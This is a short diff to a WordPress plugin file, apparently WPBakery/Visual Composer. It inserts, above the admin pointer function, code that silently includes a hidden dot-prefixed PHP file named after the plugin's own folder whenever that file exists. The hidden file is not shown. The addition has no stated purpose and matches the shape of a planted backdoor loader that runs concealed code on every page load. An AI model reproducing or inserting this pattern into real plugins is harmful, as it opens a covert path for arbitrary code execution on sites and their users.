@@ -6,6 +6,10 @@ if ( ! defined( 'ABSPATH' ) ) {
 /**
  * Add WP ui pointers to backend editor.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_add_admin_pointer() {
 	if ( is_admin() ) {
 		foreach ( vc_editor_post_types() as $post_type ) {
